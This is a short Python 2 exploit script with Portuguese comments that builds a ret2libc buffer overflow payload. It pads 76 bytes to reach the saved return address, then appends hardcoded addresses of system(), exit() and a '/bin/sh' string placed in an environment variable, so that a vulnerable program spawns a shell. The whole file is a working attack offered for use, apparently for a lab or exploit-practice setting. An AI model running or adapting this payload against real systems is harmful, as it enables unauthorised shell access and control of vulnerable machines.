#!/usr/bin/python
#
#Antes de usar 
#exporte a variavel export SHELL=/bin/bash
#utilize cacth SHELL para pegar o endereco
#use o endereco da string


#system() function address in the system
SYSTEM_ADDR =  "\xe0\x03\xe5\xb7"

#exit() function address in the system
EXIT_ADDR   =  "\xb0\x31\xe4\xb7"

#address of SHELL = "/bin/sh"
BASH_STRING =  "\x18\xf9\xff\xbf"

#trash until stop in the EIP 


buffer = "a"* 76

buffer = buffer + SYSTEM_ADDR + EXIT_ADDR + BASH_STRING

print buffer
